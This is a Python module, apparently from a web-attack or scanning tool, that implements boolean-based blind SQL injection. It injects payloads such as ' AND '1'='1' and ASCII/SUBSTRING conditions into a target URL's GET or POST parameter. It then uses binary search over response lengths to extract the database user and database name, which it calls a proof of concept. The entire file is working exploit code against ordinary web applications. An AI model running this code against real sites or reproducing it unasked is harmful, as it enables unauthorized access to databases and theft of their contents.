"""
Blind SQL Injection Data Extraction Module
Extract data using Binary Search optimization
"""

import time
import string
from colorama import Fore, Style


class BlindSQLInjectionExtractor:
    """Extract data using Boolean-based Blind SQL Injection with Binary Search"""
    
    def __init__(self, http_client, url, param_name, param_value, method='GET', db_functions=None):
        self.http_client = http_client
        self.url = url
        self.param_name = param_name
        self.param_value = param_value
        self.method = method
        self.db_functions = db_functions or self._default_functions()
        
        # Baseline response to compare
        self.baseline_length = self._get_baseline_response_length()
    
    def _default_functions(self):
        """Default MySQL functions"""
        return {
            'user': 'USER()',
            'database': 'DATABASE()',
            'version': 'VERSION()',
            'concat': 'CONCAT',
            'substring': 'SUBSTRING',
            'length': 'LENGTH',
            'ascii': 'ASCII',
            'comment': '-- '
        }
    
    def _get_baseline_response_length(self):
        """Get baseline response length for true condition"""
        try:
            # Test with always true condition
            payload = f"{self.param_value}' AND '1'='1"
            
            if self.method == 'GET':
                test_url = self.url.replace(f"{self.param_name}={self.param_value}", 
                                          f"{self.param_name}={payload}")
                response = self.http_client.get(test_url)
            else:
                data = {self.param_name: payload}
                response = self.http_client.post(self.url, data=data)
            
            return len(response.text) if response else 0
        except:
            return 0
    
    def _test_condition(self, condition):
        """Test if SQL condition is TRUE"""
        payload = f"{self.param_value}' AND {condition}{self.db_functions['comment']}"
        
        try:
            if self.method == 'GET':
                test_url = self.url.replace(f"{self.param_name}={self.param_value}", 
                                          f"{self.param_name}={payload}")
                response = self.http_client.get(test_url)
            else:
                data = {self.param_name: payload}
                response = self.http_client.post(self.url, data=data)
            
            if response:
                # Compare response length
                return abs(len(response.text) - self.baseline_length) < 50
            return False
        except:
            return False
    
    def extract_data_length(self, data_function):
        """Extract length of data using binary search"""
        print(f"{Fore.CYAN}[*] Extracting length of {data_function}...{Style.RESET_ALL}")
        
        # Binary search for length (0 to 100)
        low, high = 0, 100
        
        while low <= high:
            mid = (low + high) // 2
            condition = f"{self.db_functions['length']}({data_function})={mid}"
            
            if self._test_condition(condition):
                print(f"{Fore.GREEN}[✓] Length found: {mid}{Style.RESET_ALL}")
                return mid
            
            # Test if length > mid
            condition = f"{self.db_functions['length']}({data_function})>{mid}"
            if self._test_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        return None
    
    def extract_character_binary(self, data_function, position):
        """Extract single character using binary search on ASCII value"""
        # Binary search ASCII values (32-126 for printable chars)
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if ASCII value = mid
            condition = f"{self.db_functions['ascii']}({self.db_functions['substring']}({data_function},{position},1))={mid}"
            
            if self._test_condition(condition):
                return chr(mid)
            
            # Test if ASCII value > mid
            condition = f"{self.db_functions['ascii']}({self.db_functions['substring']}({data_function},{position},1))>{mid}"
            
            if self._test_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        return '?'
    
    def extract_data(self, data_function, max_length=50):
        """Extract complete data string"""
        print(f"{Fore.YELLOW}[*] Extracting: {data_function}{Style.RESET_ALL}")
        
        # Get length first
        length = self.extract_data_length(data_function)
        
        if not length:
            print(f"{Fore.RED}[✗] Could not determine length{Style.RESET_ALL}")
            return None
        
        if length > max_length:
            print(f"{Fore.YELLOW}[!] Data too long ({length} chars), limiting to {max_length}{Style.RESET_ALL}")
            length = max_length
        
        # Extract each character
        result = ""
        print(f"{Fore.CYAN}[*] Extracting {length} characters...{Style.RESET_ALL}")
        
        for pos in range(1, length + 1):
            char = self.extract_character_binary(data_function, pos)
            result += char
            
            # Show progress
            progress = f"Progress: {pos}/{length} - {result}"
            print(f"\r{Fore.CYAN}{progress}{Style.RESET_ALL}", end='', flush=True)
            
            time.sleep(0.1)  # Small delay to avoid overwhelming server
        
        print()  # New line after progress
        print(f"{Fore.GREEN}[✓] Extracted: {result}{Style.RESET_ALL}")
        return result
    
    def dump_database_info(self):
        """Dump current user and database name (PoC)"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] Blind SQL Injection - Data Extraction (PoC)")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        results = {}
        
        # Extract current user
        try:
            user = self.extract_data(self.db_functions['user'], max_length=30)
            if user:
                results['user'] = user
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to extract user: {e}{Style.RESET_ALL}")
        
        # Extract database name
        try:
            database = self.extract_data(self.db_functions['database'], max_length=30)
            if database:
                results['database'] = database
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to extract database: {e}{Style.RESET_ALL}")
        
        # Print summary
        if results:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"[✓] Extraction Successful!")
            print(f"{'='*60}{Style.RESET_ALL}")
            for key, value in results.items():
                print(f"{Fore.YELLOW}  {key.upper()}: {Fore.WHITE}{value}{Style.RESET_ALL}")
            print()
        
        return results
